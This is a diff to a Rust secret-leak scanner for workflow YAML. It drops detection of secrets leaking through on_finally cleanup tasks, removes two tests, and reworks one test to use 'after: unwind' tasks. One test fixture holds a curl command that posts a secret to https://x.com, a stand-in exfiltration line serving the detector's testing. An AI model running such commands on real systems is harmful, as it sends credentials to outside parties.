@@ -127,22 +127,6 @@ pub(super) fn scan_leaks(wf: &RawWorkflow, flow: &FlowFacts) -> Vec<SecretLeak> 
                 ),
             });
         }
-        if let Some((trace, sink, cleanup_idx)) = flow.finally_effect_taint(idx) {
-            let cleanup_action = wf.tasks.get(cleanup_idx).map(|t| &t.value.action);
-            leaks.push(SecretLeak {
-                task: task.value.id.value.clone(),
-                secret: trace.secret.clone(),
-                sink,
-                sink_id: wf
-                    .tasks
-                    .get(cleanup_idx)
-                    .map_or_else(|| sink.to_owned(), |t| sink_id_of(&t.value.action)),
-                trace: trace.render(),
-                reason: cleanup_action.map_or(super::declass::LeakReason::NoEgress, |a| {
-                    super::declass::leak_reason(egress_of(wf, &trace.secret), a, permits)
-                }),
-            });
-        }
     }
     leaks
 }
@@ -267,17 +251,6 @@ secrets:
         let l = leaks_of(&yaml);
         assert_eq!(l.len(), 1);
         assert!(l[0].trace.contains("with.tok"), "trace: {}", l[0].trace);
-    }
-
-    #[test]
-    fn secret_into_on_finally_cleanup_leaks() {
-        let yaml = format!(
-            "nika: w\n{SECRETS}tasks:\n  t:\n    exec: {{ command: [\"echo\", \"build\"] }}\n    on_finally:\n      - invoke: {{ tool: \"nika:write\", args: {{ path: \"x\", content: \"${{{{ secrets.api_key }}}}\" }} }}\n"
-        );
-        let l = leaks_of(&yaml);
-        assert_eq!(l.len(), 1, "the cleanup leak is reported");
-        assert_eq!(l[0].sink, "invoke");
-        assert!(l[0].trace.contains("on_finally"), "trace: {}", l[0].trace);
     }
 
     #[test]
@@ -609,32 +582,6 @@ tasks:
     }
 
     #[test]
-    fn sanctioned_on_finally_cleanup_is_clean() {
-        // the declass clears the cleanup's webhook egress (the war-room shape).
-        let yaml = "\
-nika: w
-secrets:
-  hook:
-    source: env
-    key: WEBHOOK
-    egress:
-      - to: \"nika:notify\"
-        host_from_self: true
-tasks:
-  t:
-    exec: { command: [\"echo\", \"done\"] }
-    on_finally:
-      - invoke:
-          tool: \"nika:notify\"
-          args:
-            channel: webhook
-            target: \"${{ secrets.hook }}\"
-            message: \"run finished\"
-";
-        assert!(leaks_of(yaml).is_empty(), "cleared cleanup egress → clean");
-    }
-
-    #[test]
     fn unsanctioned_later_cleanup_still_leaks_past_a_sanctioned_one() {
         // soundness: a sanctioned FIRST cleanup must not mask an
         // unsanctioned SECOND one.
@@ -653,11 +600,14 @@ secrets:
 tasks:
   t:
     exec: { command: [\"echo\", \"done\"] }
-    on_finally:
-      - invoke:
-          tool: \"nika:notify\"
-          args: { channel: webhook, target: \"${{ secrets.hook }}\", message: \"ok\" }
-      - exec: { command: [\"curl\", \"-d\", \"${{ secrets.raw }}\", \"https://x.com\"] }
+  t_notify:
+    after: { t: unwind }
+    invoke:
+      tool: \"nika:notify\"
+      args: { channel: webhook, target: \"${{ secrets.hook }}\", message: \"ok\" }
+  t_curl:
+    after: { t: unwind }
+    exec: { command: [\"curl\", \"-d\", \"${{ secrets.raw }}\", \"https://x.com\"] }
 ";
         let l = leaks_of(yaml);
         assert!(
